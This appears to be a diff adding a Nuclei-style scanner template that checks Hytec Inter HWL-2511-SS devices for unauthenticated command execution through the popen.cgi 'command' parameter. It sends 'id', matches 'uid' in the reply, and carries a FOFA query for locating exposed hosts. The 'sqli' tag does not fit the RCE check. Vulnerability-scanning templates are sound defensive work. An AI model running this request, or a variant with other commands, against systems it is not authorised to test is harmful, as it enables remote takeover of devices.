@@ -1,0 +1,29 @@
+id: Hytec-Inter-HWL-2511-SS-popen-cgi-rce
+info:
+  name: Hytec-Inter-HWL-2511-SS-popen-cgi-rce
+  author: sb
+  severity: critical
+  tags: sqli
+  metadata:
+    fofa-query: title="index" && header="lighttpd/1.4.30"
+variables:
+  s1: '{{rand_base(5, "56789")}}'
+  str: '{{rand_base(4)}}'
+  rand: '{{rand_base(3)}}'
+http:
+  - raw:
+      - |
+        GET /cgi-bin/popen.cgi?command={{rce}} HTTP/1.1
+           
+    payloads:
+      rce:
+        - "id"  
+    req-condition: true    
+    matchers-condition: and             
+    matchers:     
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body,"uid")'
+        
+
+        
